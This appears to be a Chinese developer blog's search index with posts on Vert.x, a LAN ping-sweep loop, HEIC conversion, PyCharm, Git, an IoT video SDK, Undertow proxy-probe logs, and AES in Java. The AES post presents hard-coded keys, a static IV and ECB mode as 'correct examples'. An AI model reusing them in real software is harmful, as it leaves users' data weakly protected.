&lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;$&#123;maven-surefire-plugin.version&#125;&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt; &lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt; &lt;version&gt;$&#123;exec-maven-plugin.version&#125;&lt;/version&gt; &lt;configuration&gt; &lt;mainClass&gt;io.vertx.core.Launcher&lt;/mainClass&gt; &lt;arguments&gt; &lt;argument&gt;run&lt;/argument&gt; &lt;argument&gt;$&#123;main.verticle&#125;&lt;/argument&gt; &lt;/arguments&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; MainVerticle.java1234567891011121314151617181920212223package com.example.starter;import io.vertx.core.AbstractVerticle;import io.vertx.core.Promise;public class MainVerticle extends AbstractVerticle &#123; @Override public void start(Promise&lt;Void&gt; startPromise) throws Exception &#123; vertx.createHttpServer().requestHandler(req -&gt; &#123; req.response() .putHeader(\"content-type\", \"text/plain\") .end(\"Hello from Vert.x!\"); &#125;).listen(8888, http -&gt; &#123; if (http.succeeded()) &#123; startPromise.complete(); System.out.println(\"HTTP server started on port 8888\"); &#125; else &#123; startPromise.fail(http.cause()); &#125; &#125;); &#125;&#125; 启动 tests:1./mvnw clean test 打包应用:1./mvnw clean package 启动应用服务:1./mvnw clean compile exec:java 构建HTTPServer摘自：【vertx.io/get-started】 Java代码123456789101112131415161718192021222324252627282930313233343536public class MainVerticle extends AbstractVerticle &#123; @Override public void start() throws Exception &#123; // Create a Router Router router = Router.router(vertx); // Mount the handler for all incoming requests at every path and HTTP method router.route().handler(context -&gt; &#123; // Get the address of the request String address = context.request().connection().remoteAddress().toString(); // Get the query parameter \"name\" MultiMap queryParams = context.queryParams(); String name = queryParams.contains(\"name\") ? queryParams.get(\"name\") : \"unknown\"; // Write a json response context.json( new JsonObject() .put(\"name\", name) .put(\"address\", address) .put(\"message\", \"Hello \" + name + \" connected from \" + address) ); &#125;); // Create the HTTP server vertx.createHttpServer() // Handle every request using the router .requestHandler(router) // Start listening .listen(8888) // Print the port .onSuccess(server -&gt; System.out.println( \"HTTP server started on port \" + server.actualPort() ) ); &#125;&#125; kotlin代码123456789101112131415161718192021222324252627282930313233343536class MainVerticle : AbstractVerticle() &#123; override fun start() &#123; // Create a Router val router = Router.router(vertx) // Mount the handler for all incoming requests at every path and HTTP method router.route().handler &#123; context -&gt; // Get the address of the request val address = context.request().connection().remoteAddress().toString() // Get the query parameter \"name\" val queryParams = context.queryParams() val name = queryParams.get(\"name\") ?: \"unknown\" // Write a json response context.json( json &#123; obj( \"name\" to name, \"address\" to address, \"message\" to \"Hello $name connected from $address\" ) &#125; ) &#125; // Create the HTTP server vertx.createHttpServer() // Handle every request using the router .requestHandler(router) // Start listening .listen(8888) // Print the port .onSuccess &#123; server -&gt; println(\"HTTP server started on port \" + server.actualPort()) &#125; &#125;&#125; 参考：【万字长文入门Vert.x】","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"扫描局域网机器脚本","slug":"Linux/扫描局域网机器脚本","date":"2021-12-28T15:52:36.000Z","updated":"2021-12-28T03:49:49.957Z","comments":true,"path":"Linux/扫描局域网机器脚本/","link":"","permalink":"http://yoursite.com/Linux/扫描局域网机器脚本/","excerpt":"","text":"linux 下用for循环 ping 网段：10.0.1.*1for i in 10.0.1.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i Find the target; fi; done","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"Python批量转换HEIC图片为PNG","slug":"Python/Python批量转换HEIC图片为PNG","date":"2021-12-28T13:51:36.000Z","updated":"2021-12-28T13:51:36.000Z","comments":true,"path":"Python/Python批量转换HEIC图片为PNG/","link":"","permalink":"http://yoursite.com/Python/Python批量转换HEIC图片为PNG/","excerpt":"","text":"苹果设备现在拍照的文件都是 .heic 格式，文件占的存储空间确实更小了，但导出到Windows查看，打开图片所在文件夹就被会卡到不行，为了方便整理图片，可以考虑将图片批量转为 png、jpg等格式。网上很多网站提供在线转换，这对于大量图片来说肯定不适用，而且个人图片还存在隐私问题，所以考虑用Python来做这个事情。 一、格式详解HEIF 和 HEIC 的介绍请看这篇文章：【HEIF/heic图片文件解析】简单来说，HEIF 是一个容器的图片格式，当前包含的编码 HEVC(256) 和 H.264/MPEG-4 AVC。在苹果设备采用的HEIC就是 HEIF采用 HEVC编码的一种，文件后缀为 *.heic 。 二、库如果想自己去提取HEIF文件中的图片，一定会使用到诺基亚的C++库【nokiatech/heif】，我们用Python也是要用到这个库，但我们不直接安装这个库。 pyheif 这个库不能通过 pip install pyheif 来安装，提示说要C++编译环境。 可以通过下载whl文件，然后本地安装pyheif依赖库下载我当前的环境是 Win10 + Python3.7 ，所以下载【pyheif‑0.6.1‑cp37‑cp37m‑win_amd64.whl】 三、安装依赖12pip install pyheif‑0.6.1‑cp37‑cp37m‑win_amd64.whlpip3 install Pillow 四、代码123456789101112131415161718192021222324252627282930313233import osimport pyheiffrom PIL import Image# 只遍历一级目录def get_dir_heic_files(source_path): filelist = [] fileList = os.listdir(source_path) for file in fileList: if(file.find('.heic') &gt; 0): names = file.split(\".\") filelist.append(&#123; \"filename\": names[0], \"filepath\": os.path.join(source_path, file) &#125;) return filelistdef heic2Png(src_path,target_path): print(src_path,'-&gt;',target_path) img_heic = pyheif.read(src_path) img_heic_bytes = Image.frombytes(mode=img_heic.mode, size=img_heic.size, data=img_heic.data) # img_heic_bytes.save(target_path, format=\"jpg\") img_heic_bytes.save(target_path, format=\"png\") if __name__ == '__main__': source_dir = \"D://test/\" target_dir = \"D://test/png\" if not os.path.exists(target_dir): os.makedirs(target_dir) files = get_dir_heic_files(source_dir) for file in files: target_file_path = '&#123;&#125;/&#123;&#125;.png'.format(target_dir,file['filename']) heic2Png(file['filepath'],target_file_path)","categories":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"Python创建项目","slug":"Python/PyCharm创建项目","date":"2021-12-27T13:51:36.000Z","updated":"2021-12-28T13:51:36.000Z","comments":true,"path":"Python/PyCharm创建项目/","link":"","permalink":"http://yoursite.com/Python/PyCharm创建项目/","excerpt":"","text":"PyCharm创建项目有几种选择，这里记录一下。 1. Previously configured interpereter这是使用系统安装的Python的环境，pip依赖也是安装在系统的。优点：使用现成的环境，方便快捷。特别是依赖，只要系统中使用过的库，无需重新下载安装。缺点：各个项目的Python版本可能不一样，会和系统的Python版本冲突。 2. VirtualenvVirtualenv虚拟环境为项目提供隔离的Python，解决了不同应用间多版本的冲突问题。这是在项目根目录下有一个venv目录，里面下载了你选择的Python版本，默认会安装 pip 和 setuptools。优点：不会有多版本的冲突问题。缺点：项目中的虚拟环境存在一个Python版本，依赖也是安装在虚拟环境下，耗时更加长。要手动安装依赖。 通过 pip freeze 生成 requirements.txt 文件然后通过 pip install -r requirements.txt 安装依赖更新需重新生成依赖。 3. Pipenvpipenv是代替vitualenv的工具，集成度、易用性更高，需要独立安装： pip install pipenv，上图的系统Python环境没有安装pipenv。 Pipenv 引入两个包管理文件文件 Pipfile、Pipfile.lock 解决这个问题，它会自动安装依赖。 Pycharm创建的Pipenv项目，本地已有pipenv环境。 项目的结构是： 1234567891011[[source]]url = \"https://pypi.org/simple\"verify_ssl = truename = \"pypi\"[packages][dev-packages][requires]python_version = \"3.7\" 虚拟环境的路径是统一在user目录下：","categories":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"AES加密实践","slug":"Java/AES加密实践","date":"2021-12-23T11:52:36.000Z","updated":"2021-12-28T03:24:10.140Z","comments":true,"path":"Java/AES加密实践/","link":"","permalink":"http://yoursite.com/Java/AES加密实践/","excerpt":"","text":"有项目对AES对称加密有需求，使用Java使用Aes过程中有些坑是要注意一下的。 跨平台问题AES是对称加密，利用秘钥，可以对内容加密和解密，于是我在PC开发电脑上尝试以下代码： 12345678910111213141516171819202122public static byte[] encrypt(String content, String password) &#123; KeyGenerator kgen = KeyGenerator.getInstance(\"AES\"); kgen.init(128, new SecureRandom(password.getBytes())); SecretKey secretKey = kgen.generateKey(); byte[] enCodeFormat = secretKey.getEncoded(); SecretKeySpec key = new SecretKeySpec(enCodeFormat, \"AES\"); Cipher cipher = Cipher.getInstance(\"AES\"); byte[] byteContent = content.getBytes(\"utf-8\"); cipher.init(Cipher.ENCRYPT_MODE, key); return cipher.doFinal(byteContent); &#125; public static byte[] decrypt(byte[] content, String password) &#123; KeyGenerator kgen = KeyGenerator.getInstance(\"AES\"); kgen.init(128, new SecureRandom(password.getBytes())); SecretKey secretKey = kgen.generateKey(); byte[] enCodeFormat = secretKey.getEncoded(); SecretKeySpec key = new SecretKeySpec(enCodeFormat, \"AES\"); Cipher cipher = Cipher.getInstance(\"AES\"); cipher.init(Cipher.DECRYPT_MODE, key); return cipher.doFinal(content); &#125; 这段代码在本机加密和解密都没问题，是正常的，但如果跨机器执行很大概率会解密失败，这是由于不同机器很大概率是安装了不同平台厂商的JDK和版本（特别是Android 平台）。 这是由于：上面的代码只是指定了”AES”加密，而”AES”的默认实现，不同的JDK实现不一样。 先了解一下AES加密： 秘钥长度：128位/192位/256位 加密模式有：ECB/CBC/CTR/OFB/CFB 补码填充模式有：pkcs5padding/pkcs7padding/zeropadding/nopadding/iso10126/ansix923 所以上面代码到底用的是哪一种？是由JDK决定的。 推荐的代码写法是：指定所有配置项，如”AES/ECB/PKCS5Padding” 接下来了解一下AES对称加密….. 秘钥长度AES支持三种长度的密钥： 128位，192位，256位。AES256安全性最高，AES128性能最高。 加密模式AES加密模式有两个是最常用的，ECB 和 CBC，本文就说一下这两个。 ECB 电码本模式(Electronic Codebook Book)： 简单快速利于计算的加密模式，但不太安全，加密时只需要密码。 CBC 密码分组链接模式(Cipher Block Chaining): 安全性很高的加密模式，是SSL、IPSec的标准，加密时需要密码和初始化向量IV。 补码填充 NoPadding： 不做任何填充，但是要求明文必须是16字节的整数倍，所以要自己补码。 PKCS5Padding（默认）： 如果明文块少于16个字节（128bit），在明文块末尾补足相应数量的字符，且每个字节的值等于缺少的字符数。 比如明文：{1,2,3,4,5,a,b,c,d,e} ,缺少6个字节，则补全为 {1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6 } PKCS7Padding原理与PKCS5Padding相似，区别是PKCS5Padding的blocksize为8字节，而PKCS7Padding的blocksize可以为1到255字节 ISO10126Padding：如果明文块少于16个字节（128bit），在明文块末尾补足相应数量的字节，最后一个字符值等于缺少的字符数，其他字符填充随机数。比如明文：{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则可能补全为 {1,2,3,4,5,a,b,c,d,e,5,c,3,G,$,6} 正确示例ECB示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748private static final int KEY_LEN = 16; private static final String CIP_TYPE_PKCS5_PADDING = \"AES/ECB/PKCS5Padding\"; public static void main(String[] args) throws Exception &#123; // 此处使用AES-128-ECB加密模式，passwd需要为16位。 String passwd = \"1234567890123456\"; String src = \"hello world!hello world!hello world!hello world!hello world!hello world!\"; // 加密 byte[] enByte = encrypt(src, passwd,CIP_TYPE_PKCS5_PADDING); String enString = Base64.getEncoder().encodeToString(enByte); System.out.println(\"加密后的字串是：\" + enString); // 解密 String deString = decrypt(enByte, passwd,CIP_TYPE_PKCS5_PADDING); System.out.println(\"解密后的字串是：\" + deString); &#125; // 加密 private static byte[] encrypt(String src, String passwd,String cipherType) throws Exception &#123; Cipher cipher = Cipher.getInstance(cipherType); cipher.init(Cipher.ENCRYPT_MODE, generateSecretKeySpec(passwd)); return cipher.doFinal(src.getBytes(StandardCharsets.UTF_8)); &#125; // 解密 private static String decrypt(byte[] encrypt, String passwd,String cipherType) &#123; try &#123; Cipher cipher = Cipher.getInstance(cipherType); cipher.init(Cipher.DECRYPT_MODE, generateSecretKeySpec(passwd)); byte[] original = cipher.doFinal(encrypt); return new String(original,StandardCharsets.UTF_8); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; return null; &#125; private static SecretKeySpec generateSecretKeySpec(String passwd) throws UnsupportedEncodingException &#123; // 判断Key是否为16位 if (passwd == null ||passwd.length() != KEY_LEN) &#123; System.out.print(\"passwd长度不是\" + KEY_LEN); return null; &#125; return new SecretKeySpec(passwd.getBytes(StandardCharsets.UTF_8), \"AES\"); &#125; CBC示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647private static final int KEY_LEN = 16;private static final String CIP_TYPE_CBC_PKCS5_PADDING = \"AES/CBC/PKCS5Padding\";public static void main(String[] args) throws Exception &#123; // 此处使用AES-128-ECB加密模式，passwd需要为16位。 String passwd = \"1234567890123456\"; //密钥默认偏移，最少16位 String iv = \"abcdabcdabcdabcd\"; String src = \"hello world!hello world!hello world!hello world!hello world!hello world!\";//长度非16倍数 // 加密 byte[] enByte = encrypt(src, passwd,iv,CIP_TYPE_CBC_PKCS5_PADDING); String enString = Base64.getEncoder().encodeToString(enByte); System.out.println(\"加密后的字串是：\" + enString); // 解密 String deString = decrypt(enByte, passwd,iv,CIP_TYPE_CBC_PKCS5_PADDING); System.out.println(\"解密后的字串是：\" + deString);&#125;private static byte[] encrypt(String src, String passwd, String iv, String cipherType) throws Exception &#123; Cipher c = Cipher.getInstance(cipherType); c.init(Cipher.ENCRYPT_MODE, generateSecretKeySpec(passwd), new IvParameterSpec(iv.getBytes(StandardCharsets.UTF_8))); return c.doFinal(src.getBytes(StandardCharsets.UTF_8));&#125;private static String decrypt(byte[] encrypt,String passwd, String iv, String cipherType) &#123; try &#123; Cipher c = Cipher.getInstance(cipherType); c.init(Cipher.DECRYPT_MODE, generateSecretKeySpec(passwd), new IvParameterSpec(iv.getBytes(StandardCharsets.UTF_8))); return new String(c.doFinal(encrypt),StandardCharsets.UTF_8); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null;&#125;private static SecretKeySpec generateSecretKeySpec(String passwd)throws UnsupportedEncodingException&#123; // 判断Key是否为16位 if (passwd == null ||passwd.length() != KEY_LEN) &#123; System.out.print(\"passwd长度不是\" + KEY_LEN); return null; &#125; return new SecretKeySpec(passwd.getBytes(StandardCharsets.UTF_8), \"AES\");&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[{"name":"AES","slug":"AES","permalink":"http://yoursite.com/tags/AES/"}]},{"title":"Git升级后无法clone","slug":"git/Git升级后无法clone","date":"2021-12-03T11:52:36.000Z","updated":"2021-12-28T03:24:10.232Z","comments":true,"path":"git/Git升级后无法clone/","link":"","permalink":"http://yoursite.com/git/Git升级后无法clone/","excerpt":"","text":"【2021-12-03】手贱在Win10的电脑管家上升级了Git至版本【2.34.0】，无意中发现无法执行clone命令克隆Gitlab上的仓库，Gitee、Github上的可以。 Gitlab版本信息： GitLab 10.5.5 GitLab Shell 6.0.3 GitLab Workhorse v3.6.0 GitLab API v4 Ruby 2.3.6p384 Rails 4.2.10 postgresql 9.6.5 故障表现为：123456789101112$ git clone git@192.168.0.186:kevin/test.gitCloning into 'INNC'...git@192.168.0.186's password:Permission denied, please try again.git@192.168.0.186's password:Permission denied, please try again.git@192.168.0.186's password:git@192.168.0.186: Permission denied (publickey,password).fatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists. 无论输入什么密码，都是错误的，SSH秘钥确定已经添加了，为了确定是秘钥的问题，我又重新生成了一对新的加上去，依然不行。我又在一台Linux机器上尝试克隆Gitlab仓库操作，OK一点问题都没有。 Win10这个Git有问题？猜想应该是Win10的新版Git与旧版的Gitlab兼容问题。 但是不确定是哪个版本合适，我一下子跳回到【Git-2.24.0】 问题就修复了。 总结：问题的根源还是旧版本的Gitlab，升级Gitlab是件痛苦的事情。","categories":[{"name":"git","slug":"git","permalink":"http://yoursite.com/categories/git/"}],"tags":[]},{"title":"XX物联网智能视频服务（消费版）2.0 Android SDK使用总结","slug":"P2P/腾讯云物联网智能视频服务（消费版）2.0 Android SDK使用总结","date":"2021-11-01T12:01:01.000Z","updated":"2021-11-01T12:01:01.000Z","comments":true,"path":"P2P/腾讯云物联网智能视频服务（消费版）2.0 Android SDK使用总结/","link":"","permalink":"http://yoursite.com/P2P/腾讯云物联网智能视频服务（消费版）2.0 Android SDK使用总结/","excerpt":"","text":"SDK 1.0 和 2.0 差别挺大的，目前SDK 2.3.0是最新版本 一、资源文档1. Github开源资源 项目Github仓库 VideoSDK接入说明 VideoSDK接口说明 设备与APP交互指引 设备配网 VideoSDK错误码及常见问题说明 2. 官网资源 官网文档 IoT Video Demo体验指南 云存接入指南 设备端与应用端信令交互说明 其实这部分的资料也是在Github上的，Github上的资源会比较新。 二、 SDK函数这是SDK 2.3.0所有的接口123456789101112131415161718192021222324public static native void setCallback(XP2PCallback callback);public static native int setQcloudApiCred(String id, String key);public static native int startServiceWithXp2pInfo(String id, String product_id, String device_name, String xp2p_info);public static native String delegateHttpFlv(String id);public static native int setStunServerToXp2p(String server, int port);public static native void runSendService(String id, String cmd, boolean crypto);public static native int stopSendService(String id, byte[] data);public static native int dataSend(String id, byte[] data, int len);//getCommand是废弃的接口public static native String getCommandRequestWithSync(String id, String cmd, long timeout);public static native void getCommandRequestWithAsync(String id, String cmd);public static native String postCommandRequestSync(String id, byte[] command, long cmd_len, long timeout_us);public static native int postCommandRequestWithAsync(String id, byte[] command, long cmd_len);//向camera设备请求媒体流,异步回调方式，和 delegateHttpFlv() 的使用互斥public static native void startAvRecvService(String id, String cmd, boolean crypto);public static native int stopAvRecvService(String id, byte[] data);public static native void stopService(String id); SDK函数调用顺序： setQcloudApiCred：设置密钥 setCallback：回调 startServiceWithXp2pInfo：初始化P2P连接 runSendService:如果没有发送需求可不调用该接口 dataSend:如果没有发送需求可不调用该接口 stopSendService:该接口暂时不用调用 stopService 三、P2P连接1.通过密钥连接 setQcloudApiCred(“xxx”,”xxx”) setCallback(this) startServiceWithXp2pInfo(id, productId, deviceName, “”) 这就是官方sdkdemo里面连接设备的核心函数，其中setQcloudApiCred的两个参数就是demo登录时填的密钥secretId和secretKey。这种方式做调试方便，但同时权限也是非常高，在正式App中使用不合适。 2.通过xp2p_info连接 (采用此方式) setCallback(this) startServiceWithXp2pInfo(id, productId, deviceName, “xxx”) xp2p_info这个参数在设备上线时上传给SDK服务器，我们自建后台可以通过云API获取到。初始化P2P连接时，给startServiceWithXp2pInfo()传入xp2p_info参数即可连接设备。 官网文档摘录：SDK需要的xp2p info需要App侧从自己的业务后台获取；获取到xp2p info后，可以通过上述的startServiceWithXp2pInfo接口将该info传给SDK，示例代码如下： 1234&gt; String xp2p_info = getXP2PInfo(...) // 从自建后台获取xp2p info&gt; XP2P.setCallback(this)&gt; XP2P.startServiceWithXp2pInfo(id, product_id, device_name, xp2p_info)&gt; 四、播放音视频在连接上P2P的前提下，连接音视频也非常简单： val flv_url = XP2P.delegateHttpFlv(id) 使用ijkPlayer播放 flv_url 注意：如果P2P没有连接上，这里获取的flv_url为null 我分析这是将设备端的音视频封装为FLV格式，ijkPlayer本身是支持这些格式的，再经过自己魔改一下ijkPlayer使得它支持P2P传输，所以App开发者也不需要自己解码了，给ijkPlayer配一个TextureView就能播放了。 五、说话、发送声音步骤： XP2P.postCommandRequestSync() 发送信令检查设备的状态（是否允许语音通话） XP2P.runSendService() 启动服务 录音PCM，PCM编码ACC，ACC封装为FLV XP2P.dataSend() 发送FLV数据 XP2P.stopSendService() 停止服务 注意：语音编码可以采用其他如G711A、PCM，但必须封装为FLV，否则不能发送。 FLV格式请参考【FLV封装格式解析】 六、云台信令 postCommandRequestSync 发送信令 信令内容：1234控制ipc左移:action=user_define&amp;channel=xxx&amp;cmd=ptz_left控制ipc右移:action=user_define&amp;channel=xxx&amp;cmd=ptz_right控制ipc上移:action=user_define&amp;channel=xxx&amp;cmd=ptz_up控制ipc下移:action=user_define&amp;channel=xxx&amp;cmd=ptz_down 七、自定义信令交互 postCommandRequestSync 发送信令 格式： action=user_define&amp;channel=xxx&amp;cmd=xxx 自定义数据必须跟在 cmd=xxx 后面 八、回放1.本地回放 postCommandRequestSync 用查询录像（action=inner_define&amp;channel=0&amp;cmd=get_record_index&amp;start_time=000&amp;end_time=111） ijkplayer点播（ipc.flv?action=playback&amp;channel=xxx&amp;start_time=xxx&amp;end_time=yyy） 暂停回放、继续回放 录像进度条滑动 2.云回放 云API查询录像 获取m3u8 URL ijkplayer点播","categories":[{"name":"p2p","slug":"p2p","permalink":"http://yoursite.com/categories/p2p/"}],"tags":[]},{"title":"Ubuntu中安装IDEA设置桌面图标","slug":"Linux/Ubuntu中安装IDEA设置桌面图标","date":"2021-10-28T14:52:36.000Z","updated":"2021-12-28T03:24:10.177Z","comments":true,"path":"Linux/Ubuntu中安装IDEA设置桌面图标/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu中安装IDEA设置桌面图标/","excerpt":"","text":"在Ubuntu桌面版中安装IDEA，Jetbrains只提供 tar.gz 格式包，解压即可使用，但需要执行 idea.sh ，没有快捷方式对桌面系统很不友好。 我们可以手动编辑一个快捷方式，在桌面创建一个名为 idea.desktop的文件，假如我们解压目录地址为 /usr/local 内容为：123456789101112131415161718192021[Desktop Entry]Version=2021.2.2Type=ApplicationName=IDEAComment=IntelliJ IDEAExec=sh /usr/local/idea/bin/idea.shTerminal=falseIcon=/usr/local/idea/bin/idea.pngTerminal=falseEncoding=UTF-8Categories=Development; 还需要给这个文件赋予运行权限：1$ sudo chmod +x idea.desktop 这样双击就能打开IDEA啦！","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"Undertow request failed HttpServerExchange","slug":"SpringBoot/Undertow request failed HttpServerExchange","date":"2021-10-12T13:52:36.000Z","updated":"2021-10-12T13:52:36.000Z","comments":true,"path":"SpringBoot/Undertow request failed HttpServerExchange/","link":"","permalink":"http://yoursite.com/SpringBoot/Undertow request failed HttpServerExchange/","excerpt":"","text":"部署一个简单的 Springboot Web 项目在阿里云ESC公网，web容器由Tomcat切换为Undertow。 1. 异常信息跑一段时间后，在日志中经常出现一些其他域名相关的奇怪异常，而且很难复现。如下： 以下只贴出带有域名的异常，其实IP的异常居多 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687882021-09-30 09:14:02.935 ERROR 18684 --- [ XNIO-1 I/O-1] io.undertow.request :UT005071: Undertow request failed HttpServerExchange&#123; CONNECT www.baidu.com:443&#125;java.lang.IllegalArgumentException: UT000068: Servlet path match failed at io.undertow.servlet.handlers.ServletPathMatchesData.getServletHandlerByPath(ServletPathMatchesData.java:83) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletPathMatches.getServletHandlerByPath(ServletPathMatches.java:88) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleRequest(ServletInitialHandler.java:146) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.HttpContinueReadHandler.handleRequest(HttpContinueReadHandler.java:65) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpReadListener.handleEventWithNoRunningRequest(HttpReadListener.java:255) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpReadListener.handleEvent(HttpReadListener.java:136) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:162) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:100) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:57) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.ChannelListeners$10.handleEvent(ChannelListeners.java:291) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.ChannelListeners$10.handleEvent(ChannelListeners.java:286) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.QueuedNioTcpServer$1.run(QueuedNioTcpServer.java:129) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.WorkerThread.safeRun(WorkerThread.java:582) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.WorkerThread.run(WorkerThread.java:466) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]2021-10-02 01:57:00.626 ERROR 18684 --- [ XNIO-1 I/O-1] io.undertow.request :UT005071: Undertow request failed HttpServerExchange&#123; GET ab2h&#125;java.lang.IllegalArgumentException: UT000068: Servlet path match failed at io.undertow.servlet.handlers.ServletPathMatchesData.getServletHandlerByPath(ServletPathMatchesData.java:83) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletPathMatches.getServletHandlerByPath(ServletPathMatches.java:88) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleRequest(ServletInitialHandler.java:146) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.HttpContinueReadHandler.handleRequest(HttpContinueReadHandler.java:65) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpReadListener.handleEventWithNoRunningRequest(HttpReadListener.java:255) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpReadListener.handleEvent(HttpReadListener.java:136) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpReadListener.handleEvent(HttpReadListener.java:59) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.conduits.ReadReadyHandler$ChannelListenerHandler.readReady(ReadReadyHandler.java:66) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.NioSocketConduit.handleReady(NioSocketConduit.java:88) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.WorkerThread.run(WorkerThread.java:561) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]2021-10-10 22:14:39.423 ERROR 18684 --- [ XNIO-1 I/O-1] io.undertow.request : UT005071: Undertow request failed HttpServerExchange&#123; CONNECT www.sogo.com:443&#125;java.lang.IllegalArgumentException: UT000068: Servlet path match failed at io.undertow.servlet.handlers.ServletPathMatchesData.getServletHandlerByPath(ServletPathMatchesData.java:83) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletPathMatches.getServletHandlerByPath(ServletPathMatches.java:88) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleRequest(ServletInitialHandler.java:146) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.HttpContinueReadHandler.handleRequest(HttpContinueReadHandler.java:65) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpReadListener.handleEventWithNoRunningRequest(HttpReadListener.java:255) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpReadListener.handleEvent(HttpReadListener.java:136) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:162) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:100) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:57) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.ChannelListeners$10.handleEvent(ChannelListeners.java:291) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.ChannelListeners$10.handleEvent(ChannelListeners.java:286) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.QueuedNioTcpServer$1.run(QueuedNioTcpServer.java:129) 